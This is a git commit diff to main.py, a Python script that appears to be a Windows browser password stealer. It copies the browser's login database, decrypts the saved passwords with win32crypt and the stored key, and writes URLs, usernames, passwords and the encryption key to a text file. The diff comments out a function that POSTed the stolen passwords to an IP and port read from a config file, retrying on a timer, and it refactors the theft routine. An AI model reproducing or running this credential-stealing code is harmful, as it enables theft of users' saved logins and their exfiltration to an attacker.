63f3461b0d10b0d9e9b5bf56278a8f8850437d62
Josakko <112590914+Josakko@users.noreply.github.com>
2023-04-26 20:54:53 +0200

    Update main.py

--- main.py
+++ main.py
@@ -10,7 +10,7 @@ import win32crypt
 import sys
 
 
-def delete_file():
+def delete_file(file):
     try:
         os.remove(file)
         #os.remove("passwords.txt")
@@ -18,29 +18,28 @@ def delete_file():
         pass
 
 
-try:
-    with open("todo.txt", "r") as f:
-        lines = f.readlines()
-        ip_address = lines[0].strip()
-        interval = int(lines[1])
-        port = lines[2]
-        f.close()
-except:
-    pass
-
-def send():
-    try:
-        with open("passwords.txt", "r") as f:
-            payload = json.dumps({"content": f.read()})
-            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
-        delete_file()
-        return
-    except:
-        try:
-            timer = threading.Timer(interval, send)
-            timer.start()
-        except:
-            return
+#try:
+#    with open("todo.txt", "r") as f:
+#        lines = f.readlines()
+#        ip_address = lines[0].strip()
+#        interval = int(lines[1])
+#        port = lines[2]
+#        f.close()
+#except:
+#    pass
+#def send():
+#    try:
+#        with open("passwords.txt", "r") as f:
+#            payload = json.dumps({"content": f.read()})
+#            requests.post(f"http://{ip_address}:{port}", data=payload, headers={"Content-Type": "application/json"})
+#        delete_file()
+#        return
+#    except:
+#        try:
+#            timer = threading.Timer(interval, send)
+#            timer.start()
+#        except:
+#            return
         
         
 def load_path(id):
@@ -64,13 +63,12 @@ def store_data(data):
         f.write("\n##########################################")
         f.write(data)
         f.write("##########################################")
-        #f.write(f"\n################=Encryption-Key=################\n{fetch_key()}")
 
 
-def fetch_key():
+def fetch_key(key_dir):
     try:
         try:
-            dir_path = os.path.join(os.environ["USERPROFILE"], load_path("dir"))
+            dir_path = os.path.join(os.environ["USERPROFILE"], key_dir)
         except:
             return
             
@@ -97,37 +95,43 @@ def decrypt_password(password, key):
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            return "Password could not be decrypted"
+            return "Password could not be decrypted or none were found!"
 
+def save_passwords(db_dir, key_dir):
+    try:
+        db_path = os.path.join(os.environ["USERPROFILE"], db_dir)
+    except:
+        sys.exit(0)
+    file = "data.db"
+    try:
+        shutil.copyfile(db_path, file)
+    except:
+        sys.exit(0)
+        
+    db = sqlite3.connect(file)
+    cursor = db.cursor()
 
-try:
-    db_path = os.path.join(os.environ["USERPROFILE"], load_path("db"))
-except:
-    sys.exit(0)
-file = "data.db"
-try:
-    shutil.copyfile(db_path, file)
-except:
-    sys.exit(0)
-    
-db = sqlite3.connect(file)
-cursor = db.cursor()
+    cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")
 
-cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "" order by date_last_used")
+    for row in cursor.fetchall():
+        main_url = row[0]
+        login_url = row[1]
+        username = row[2]
+        date_created = row[4]
+        last_usage = row[5]
 
-for row in cursor.fetchall():
-    main_url = row[0]
-    login_url = row[1]
-    username = row[2]
-    date_created = row[4]
-    last_usage = row[5]
+        if username or decrypt_password(row[3], fetch_key(key_dir)):
+            data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key(key_dir))}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
+            store_data(data)
+        else:
+            continue
 
-    if username or decrypt_password(row[3], fetch_key()):
-        data = f"\nAction URL: {main_url}\nLogin URL: {login_url}\nUsername: {username}\nPassword: {decrypt_password(row[3], fetch_key())}\nDate of creation: {date_created}\nLast usage: {last_usage}\n"
-        store_data(data)
-    else:
-        continue
+    with open("passwords.txt", "a") as f:
+        f.write(f"\n################==Encryption-Key==################\n{fetch_key(key_dir)}")
 
-cursor.close()
-db.close()
-send()
+    cursor.close()
+    db.close()
+    delete_file(file)
+    #send()
+
+save_passwords(load_path("db"), load_path("dir"))
